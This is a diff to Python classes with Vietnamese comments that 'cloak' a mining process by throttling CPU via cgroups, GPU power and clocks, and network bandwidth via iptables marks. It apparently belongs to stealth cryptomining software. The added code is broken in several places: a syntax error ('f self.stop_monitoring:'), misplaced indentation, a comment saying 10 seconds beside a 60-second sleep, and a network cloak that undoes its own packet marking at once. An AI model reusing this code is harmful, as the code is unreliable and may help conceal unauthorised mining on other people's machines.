@@ -154,17 +154,12 @@ class CpuCloakStrategy(CloakStrategy):
         try:
             pid, name = process.pid, process.name
 
-            # 1) Xoá cgroup CPU (khôi phục usage)
+            # Gọi hàm restore_resources để khôi phục toàn bộ tài nguyên
             success_restore = self.cpu_resource_manager.restore_resources(pid)
             if success_restore:
-                self.logger.info(f"[CPU Restore] Xoá cgroup CPU cho {name}(PID={pid}).")
-
-            # 2) Bỏ hạn chế CPU outside => set=0 => remove cgroup
-            unlimit_ok = self.cpu_resource_manager.limit_cpu_for_external_processes(
-                [pid] + self.exempt_pids, 0
-            )
-            if unlimit_ok:
-                self.logger.info(f"[CPU Restore] Huỷ giới hạn CPU outside (PID={pid}).")
+                self.logger.info(f"[CPU Restore] Tài nguyên CPU đã được khôi phục cho {name}(PID={pid}).")
+            else:
+                self.logger.error(f"[CPU Restore] Không thể khôi phục tài nguyên CPU cho {name}(PID={pid}).")
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"CPU Restore: Tiến trình không tồn tại: {e}")
@@ -210,7 +205,7 @@ class GpuCloakStrategy(CloakStrategy):
             self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định 20%.")
             self.throttle_percentage = 20
 
-        self.target_sm_clock = config.get('sm_clock', 1300)
+        self.target_sm_clock = config.get('sm_clock', 1240)
         self.target_mem_clock = config.get('mem_clock', 877)
 
         self.temperature_threshold = config.get('temperature_threshold', 80)
@@ -240,6 +235,11 @@ class GpuCloakStrategy(CloakStrategy):
                 if current_pl is None:
                     continue
 
+            # Bỏ qua nếu công suất hiện tại đã thấp hơn 100W
+                if current_pl <= 100:
+                    self.logger.warning(f"[GPU Cloaking] GPU={gpu_index} => power={current_pl}W (PID={pid}).")
+                    continue
+                
                 desired_pl = int(round(current_pl * (1 - self.throttle_percentage / 100)))
                 ok_pl = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_pl)
                 if ok_pl:
@@ -253,15 +253,21 @@ class GpuCloakStrategy(CloakStrategy):
 
             # limit_temperature (nếu cần)
             for gpu_index in range(gpu_count):
+                f self.stop_monitoring:  # Kiểm tra cờ dừng giám sát
+                    self.logger.info("[GPU Cloaking] Dừng giám sát nhiệt độ do yêu cầu khôi phục tài nguyên.")
+                    break
                 success_temp = self.gpu_resource_manager.limit_temperature(
                     gpu_index=gpu_index,
                     temperature_threshold=self.temperature_threshold,
                     fan_speed_increase=self.fan_speed_increase
                 )
-                if success_temp:
-                    self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
-                else:
-                    self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")
+            if success_temp:
+                self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
+            else:
+                self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")
+
+            # Chờ 10 giây trước khi kiểm tra lại
+            time.sleep(60)
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
@@ -280,6 +286,8 @@ class GpuCloakStrategy(CloakStrategy):
         :param process: Đối tượng MiningProcess.
         """
         try:
+            self.stop_monitoring = True  # Dừng giám sát nhiệt độ khi khôi phục tài nguyên
+
             pid, name = process.pid, process.name
             success = self.gpu_resource_manager.restore_resources(pid)
             if success:
@@ -358,6 +366,10 @@ class NetworkCloakStrategy(CloakStrategy):
             self.process_marks[pid] = mark
             self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")
 
+            # Rollback mark_packets
+            self.network_resource_manager.unmark_packets(pid, mark)
+            return
+
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
         except psutil.AccessDenied as e:
@@ -370,36 +382,20 @@ class NetworkCloakStrategy(CloakStrategy):
 
     def restore(self, process: MiningProcess) -> None:
         """
-        Khôi phục băng thông mạng (đồng bộ).
-        
-        :param process: Đối tượng MiningProcess.
+        Khôi phục tài nguyên mạng cho một tiến trình cụ thể.
+
+        :param process: Đối tượng MiningProcess cần khôi phục tài nguyên.
         """
         try:
             pid, name = process.pid, process.name
-            mark = self.process_marks.get(pid)
-            if mark is None:
-                self.logger.warning(f"[Net Restore] Không tìm thấy mark cho PID={pid}.")
-                return
 
-            ok_bw = self.network_resource_manager.remove_bandwidth_limit(self.network_interface, mark)
-            if ok_bw:
-                self.logger.info(f"[Net Restore] Đã gỡ hạn chế băng thông cho PID={pid}.")
-
-            ok_unmark = self.network_resource_manager.unmark_packets(pid, mark)
-            if ok_unmark:
-                self.logger.info(f"[Net Restore] Đã xoá iptables MARK cho PID={pid}.")
-
-            if pid in self.process_marks:
-                del self.process_marks[pid]
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Net Restore: Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Net Restore: Không đủ quyền cho PID={process.pid}: {e}")
+            self.logger.debug(f"[Net Restore] Bắt đầu khôi phục tài nguyên cho PID={pid}, Name={name}.")
+            if self.restore_resources(pid=pid):
+                self.logger.info(f"[Net Restore] Đã khôi phục tài nguyên mạng cho PID={pid}, Name={name}.")
+            else:
+                self.logger.error(f"[Net Restore] Khôi phục tài nguyên mạng thất bại cho PID={pid}, Name={name}.")
         except Exception as e:
-            self.logger.error(
-                f"Lỗi khôi phục mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
+            self.logger.error(f"[Net Restore] Lỗi không xác định khi khôi phục mạng cho {name}(PID={pid}): {e}\n{traceback.format_exc()}")
             raise
 
 ###############################################################################
